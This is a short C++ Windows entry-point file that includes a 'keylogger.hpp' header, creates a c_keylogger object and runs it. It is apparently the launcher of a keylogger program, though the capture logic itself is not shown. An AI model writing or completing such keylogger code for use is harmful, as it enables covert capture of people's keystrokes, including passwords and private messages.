#include "keylogger.hpp"

int APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev_instance, _In_ LPWSTR cmd_line, _In_ int show_cmd)
{
    logger = std::make_unique<c_keylogger>();
    return logger->run();
}
